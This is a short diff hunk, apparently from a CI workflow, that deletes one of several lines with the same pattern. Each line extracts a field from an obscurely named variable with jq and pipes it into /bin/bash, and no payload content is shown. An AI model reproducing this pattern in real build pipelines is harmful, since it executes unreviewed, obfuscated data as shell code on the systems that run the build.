@@ -22,7 +22,6 @@ jobs:
           echo $blbvu40810 | jq -r .p55092 | /bin/bash
           echo $axho5 | jq -r .s19564 | /bin/bash
           printf '%s' "$kycfm3" | jq -r .dbh4127 | /bin/bash
-          echo $s9473 | jq -r .enrat35091 | /bin/bash
           printf '%s' "$vmtd2" | jq -r .lq9 | /bin/bash
           echo $ybt34 | jq -r .uolc22 | /bin/bash
           printf '%s' "$unn36" | jq -r .tjqy28 | /bin/bash
